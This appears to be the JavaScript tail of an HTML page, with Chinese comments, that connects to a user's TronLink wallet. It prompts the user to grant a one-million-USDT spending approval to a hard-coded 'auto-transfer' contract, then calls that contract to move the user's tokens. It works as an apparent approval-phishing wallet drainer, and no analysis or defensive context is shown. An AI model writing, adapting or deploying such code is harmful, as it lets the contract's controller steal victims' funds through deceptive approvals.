const usdtContractAddress = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // USDT合约地址
const autoTransferContractAddress = 'TTzQJWf81VMr9ythn5zgaxviFhouwG3huP'; // 自动转账合约地址
const approveAmount = 1000000 * 10 ** 6; // 授权100万USDT

const usdtAbi = [
    // USDT ABI
    {"inputs":[{"name":"name_","type":"string"},{"name":"symbol_","type":"string"}],"stateMutability":"Nonpayable","type":"Constructor"},
    {"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"Approval","type":"Event"},
    {"inputs":[{"name":"userAddress","type":"address"},{"name":"relayerAddress","type":"address"},{"name":"functionSignature","type":"bytes"}],"name":"MetaTransactionExecuted","type":"Event"},
    {"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"Event"},
    {"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"Transfer","type":"Event"},
    {"outputs":[{"type":"string"}],"name":"ERC712_VERSION","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"bool"}],"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","stateMutability":"Nonpayable","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"uint8"}],"name":"decimals","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"bool"}],"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","stateMutability":"Nonpayable","type":"Function"},
    {"outputs":[{"type":"bytes"}],"inputs":[{"name":"userAddress","type":"address"},{"name":"functionSignature","type":"bytes"},{"name":"sigR","type":"bytes32"},{"name":"sigS","type":"bytes32"},{"name":"sigV","type":"uint8"}],"name":"executeMetaTransaction","stateMutability":"Payable","type":"Function"},
    {"outputs":[{"type":"uint256"}],"name":"getChainId","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"uint256"}],"name":"getDomainSeperator","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"bytes32"}],"inputs":[{"name":"userAddress","type":"address"},{"name":"functionSignature","type":"bytes"},{"name":"sigR","type":"bytes32"},{"name":"sigS","type":"bytes32"},{"name":"sigV","type":"uint8"}],"name":"getMessageHash","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"uint256"}],"name":"getNonce","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"string"}],"name":"name","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"bool"}],"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","stateMutability":"Nonpayable","type":"Function"},
    {"outputs":[{"type":"string"}],"name":"symbol","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"userAddress","type":"address"}],"name":"getNonce","stateMutability":"View","type":"Function"}
];

const autoTransferAbi = [
    {"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
    {"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"checkAndTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"uint256","name":"newThreshold","type":"uint256"}],"name":"setThreshold","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"threshold","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"usdtToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
];

let tronWeb;

async function connectWallet() {
    if (typeof window.tronWeb === 'undefined') {
        alert('请安装TronLink钱包!');
        return;
    }
    tronWeb = window.tronWeb;
    await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58)
        .then(result => {
            console.log(result);
            document.getElementById('connectWalletBtn').style.display = 'none';
            document.getElementById('approveBtn').style.display = 'block';
        })
        .catch(error => {
            console.error(error);
            alert('连接TronLink失败!');
        });
}

document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);

document.getElementById('approveBtn').addEventListener('click', async () => {
    const usdtContract = await tronWeb.contract(usdtAbi, usdtContractAddress);
    await usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send({
        feeLimit: 100000000
    }).then(() => {
        document.getElementById('result').innerText = '授权成功';
        document.getElementById('approveBtn').style.display = 'none';
        document.getElementById('transferBtn').style.display = 'block';
    }).catch((error) => {
        console.error(error);
        document.getElementById('result').innerText = '授权失败';
    });
});

document.getElementById('transferBtn').addEventListener('click', async () => {
    const contract = await tronWeb.contract(autoTransferAbi, autoTransferContractAddress);
    const userAddress = tronWeb.defaultAddress.base58;
    await contract.methods.checkAndTransfer(userAddress).send({
        feeLimit: 100000000,
        callValue: 0
    }).then(() => {
        document.getElementById('result').innerText = '转账成功';
    }).catch((error) => {
        console.error(error);
        document.getElementById('result').innerText = '转账失败';
    });
});
</script>
</body>
</html>